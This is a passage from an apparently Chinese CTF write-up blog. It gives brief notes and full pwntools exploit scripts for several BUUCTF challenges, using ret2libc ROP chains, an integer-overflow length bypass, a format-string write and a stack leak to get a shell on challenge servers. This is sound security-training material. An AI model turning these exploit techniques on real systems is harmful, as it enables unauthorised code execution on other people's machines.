string">'/bin/sh\x00'</span> <span class="token comment" spellcheck="true"># at ebp-0x28</span>payload2 <span class="token operator">=</span> payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x28</span><span class="token punctuation">,</span> b<span class="token string">'p'</span><span class="token punctuation">)</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>original_ebp <span class="token operator">-</span> <span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># hijack ebp ,-0x38 is the aaaa</span>payload2 <span class="token operator">+=</span> p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># new leave ret</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><a href="https://www.cnblogs.com/max1z/p/15299000.html">参考博客</a></p><h1 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h1><p>经典ret2libc3</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072259415.png" alt="image-20230807225923356"></p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p = process('./pwn') </span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">28146</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>pay1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0xD</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay1<span class="token punctuation">)</span>write_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0xf7db1190</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"write_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_addr<span class="token punctuation">)</span>offset<span class="token operator">=</span>write_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>offset<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sys_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sh_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>pay2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><h2 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h2><p>32位开NX泄露libc</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081045150.png" alt="image-20230808104509112"></p><p>注意get_n是自定义函数</p><p>规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。</p><p>ROP链泄露libc，溢出覆盖返回地址getshell</p><h2 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p = process('./pwn0') </span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26602</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"How many bytes do you want me to read?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'-1'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn0'</span><span class="token punctuation">)</span> main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>fmt <span class="token operator">=</span> <span class="token number">0x080486F</span>pay1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt)</span><span class="token comment" spellcheck="true">#pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay1<span class="token punctuation">)</span>getchar_addr<span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getchar_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>getchar_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''libc=LibcSearcher('getchar',getchar_addr)offset=getchar_addr-libc.dump('getchar')binsh=offset+libc.dump('str_bin_sh')system=offset+libc.dump('system')'''</span>base_addr <span class="token operator">=</span> getchar_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'getchar'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> base_addrbinsh <span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> base_addr<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>base_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print("libc_base_addr = ",hex(offset))</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sys_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"sh_addr = "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>pay2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x2c</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"How many bytes do you want me to read?"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>b<span class="token string">'-1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">"\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="bjdctf-2020-babyrop"><a href="#bjdctf-2020-babyrop" class="headerlink" title="bjdctf_2020_babyrop"></a>bjdctf_2020_babyrop</h1><h2 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h2><p>注意这题位64位。32位和64位传参有区别</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072310866.png" alt="image-20230807231036816"></p><p>思路：</p><ol><li>利用puts函数泄露出puts函数真实地址</li><li>通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址</li><li>构造rop链栈溢出getshell</li></ol><p>puts函数通过pop rdi ; ret 传参</p><p>用ROPgadget可以找到</p><h2 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#encoding = utf-8</span> <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>  context<span class="token punctuation">(</span>os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>     <span class="token keyword">else</span><span class="token punctuation">:</span>        p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29917</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#elf</span>    main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>    plt_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    got_addr  <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>    pop_rdi   <span class="token operator">=</span> <span class="token number">0x0400733</span>    ret_addr  <span class="token operator">=</span> <span class="token number">0x04004c9</span>        payload   <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>got_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>plt_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Pull up your sword and tell me u story!\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#libc</span>    lib         <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>     lib_puts_addr   <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>    lib_system_addr <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>    lib_bin_addr    <span class="token operator">=</span> lib<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#base</span>    base_addr       <span class="token operator">=</span> puts_addr <span class="token operator">-</span> lib_puts_addr    system_addr<span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_system_addr    bin_addr<span class="token operator">=</span> base_addr <span class="token operator">+</span> lib_bin_addr    payload<span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Pull up your sword and tell me u story!\n"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="HarekazeCTF2019-baby-rop2"><a href="#HarekazeCTF2019-baby-rop2" class="headerlink" title="[HarekazeCTF2019]baby_rop2"></a>[HarekazeCTF2019]baby_rop2</h1><p>64位的ret2libc3</p><h2 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h2><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308080953982.png" alt="image-20230808095301880"></p><p>利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。</p><h2 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h2><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">25502</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = process('./babyrop2')</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babyrop2'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要用题目给的libc文件，可能必须要用题目给的才能打通</span>printf_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>read_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>main_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x0000000000400733</span>pop_rsi_r15 <span class="token operator">=</span> <span class="token number">0x0000000000400731</span>fmt <span class="token operator">=</span> <span class="token number">0x0000000000400790</span>payload1 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fmt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi_r15<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>read_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>printf_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main_plt<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name? "</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>read_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>b<span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> b<span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"read_addr ======>> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> read_addr <span class="token operator">-</span>  libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>bin_sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>payload2 <span class="token operator">=</span> b<span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x28</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h1><p>BUUCTF pwn<br>考点：格式化字符串漏洞</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308072321504.png" alt="image-20230807232152466"></p><p>格式化字符串，任意地址写漏洞</p><p>将x写为4即可getshell，x的地址为0x0804a02c，调试可得输入的内容位于栈偏移11个单位处</p><p>exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#p = process('./pwn')</span>p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">29551</span><span class="token punctuation">)</span>x_addr<span class="token operator">=</span><span class="token number">0x804A02C</span>payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>x_addr<span class="token punctuation">)</span><span class="token operator">+</span>b<span class="token string">"%11$n"</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>或更通用</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python2</span><span class="token comment" spellcheck="true">#-*- coding=UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token comment" spellcheck="true">#sh = process('./jarvisoj_fm')</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">26325</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)</span>x_addr <span class="token operator">=</span> <span class="token number">0x0804a02c</span><span class="token comment" spellcheck="true">#将栈偏移13个单位处的x_addr指针指向的地址内容修改为4</span><span class="token comment" spellcheck="true">#payload中x_addr写入的位置为栈偏移13处，见下图</span><span class="token comment" spellcheck="true">#25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13</span>payload <span class="token operator">=</span> <span class="token string">'%4c%13$n'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>x_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'cat flag'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><h2 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h2><p>64位开启NX</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081846151.png" alt="image-20230808184656119"></p><p>注意程序直接使用sys_read和sys_write函数而不是通常的read和write，在构造payload时要注意在函数返回时没有pop rbp这一步而是直接执行ret，所以我们直接覆盖rbp为vuln函数地址。</p><h2 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h2><p>本题两种做法，一种是ret2csu，利用__libc_csu_init布置栈空间；一种是SROP</p><p>题目也给出了相应的gadgets，若选择rax传参0xF（系统调用号），则可执行sigreturn系统调用；若选择rax传参0x3B，则可执行excve(‘/bin/sh’,0,0)系统调用</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081841853.png" alt="image-20230808184158810"></p><p>我们需要在栈上布置ROPgadgets和各参数，而栈地址是随机的，所以我们首先要泄露栈地址。</p><p>同时我们知道栈上的各地址间的相对位置是不变的，所以泄露出栈地址后可以通过与buf的偏移计算出buf的地址</p><p>经过调试发现，如图： buf的起始地址为0x7fffffffded0，目标泄露栈地址（即某个rbp的值）为图中栈偏移为02的地址0x7fffffffe018，二者相差0x148。这是本地的偏移，若要获得与远程环境相同的偏移要应用patchelf。具体可看这篇文章。用相同的方法调试可得远程偏移为0x118.</p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857706.png" alt="image-20230808185715664"></p><p><img src="https://raw.githubusercontent.com/lmarch2/images/main/typora/202308081857588.png" alt="image-20230808185747565"></p><p>在接收泄露的栈地址之前需要去掉多余的buf(0x10)+rbp(vul_addr)+栈上偏移为01的地址。</p><p>exp第一部分</p><pre class=" language-python"><code class="language-python">vul_addr <span class="token operator">=</span> <span class="token number">0x4004ed</span>ret_addr <span class="token operator">=</span> <span class="token number">0x4003a9</span>vul_addr <span class="token operator">=</span> <span class="token number">0x4004ed</span>payload <span class="token operator">=</span> b<span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vul_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#buf_addr = stack_addr-0x118</span>buf_addr <span class="token operator">=</span> 